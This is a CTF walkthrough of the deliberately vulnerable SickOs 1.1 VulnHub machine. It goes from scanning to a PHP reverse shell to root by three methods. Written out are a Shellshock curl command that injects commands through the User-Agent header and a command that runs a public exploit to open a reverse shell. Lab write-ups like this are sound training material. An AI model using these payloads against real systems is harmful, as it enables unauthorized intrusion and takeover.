## SickOs 1.1 VulnHub VM walkthrough

SickOs 1.1 by https://twitter.com/sayli_ambure

Link: https://www.vulnhub.com/entry/sickos-11,132/

```
This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. 
This vm is very similar to labs I faced in OSCP. 
The objective being to compromise the network/machine and gain Administrative/root privileges on them.
```

## Solution

#### Sudo Netdiscover

![](Assets/1.png)

> IP address: 192.168.1.11

#### Port scan: Nmap -sC -sV -Pn -p- -A 192.168.1.11
![](Assets/2.png)

> Squid HTTP Proxy is running on port 3128 > Firefox Web proxy 192.168.1.11:3128 > Squid web server
 
#### Nikto: Nikto -h 192.168.1.11 -useproxy 192.168.1.11:3128 
![](Assets/3.png)

> /cgi-bin/status > vulnerable to `ShellShock`

#### Burp proxy 192.168.1.11 : 3128  >> 192.168.1.11/robots.txt
![](Assets/4.png)

> `Wolfcms` directory

#### Login page >> admin:admin
![](Assets/5.png)

> Logged in

#### Add IP and port to php Reverse shell
![](Assets/6.png)

> Added my own IP and port

#### Shell upload
![](Assets/7.png)

> Uploaded php reverse shell

#### Nc -nvlp 4444 & visited url of shell
![](Assets/8.png)

> Got reverse shell

#### Visit /var/www/
![](Assets/9.png)

> `Wolfcms` directory and Read n Write permissions for `connect.py`

### Method 1: Using connect.py

#### Visit `cron.d`
![](Assets/10.png)

> Automated connect.py

#### Create payload with msfvenum 
![](Assets/11.png)

#### Echo payload to connect.py
![](Assets/12.png)

#### Nc -nvlp 7777
![](Assets/13.png)

> Got root

### Method 2: Using config.php

#### `Config.php`
![](Assets/14.png)

> Got password john@123

![](Assets/15.png)

> Got root

### Method 3: Using shellshock

#### Check if cmd works

`curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"`

![](Assets/16.png)

#### Searchsploit -m 34900.py
![](Assets/17.png)

> Downloaded shellshock exploit

#### Python Reverse shell

`Python 34900.py payload=reverse rhost=192.168.1.11 lhost=192.168.1.7 lport=1234 proxy=192.168.1.11:3128 pages=/cgi-bin/status`

![](Assets/18.png)

> Repeat Method 2

> Get root
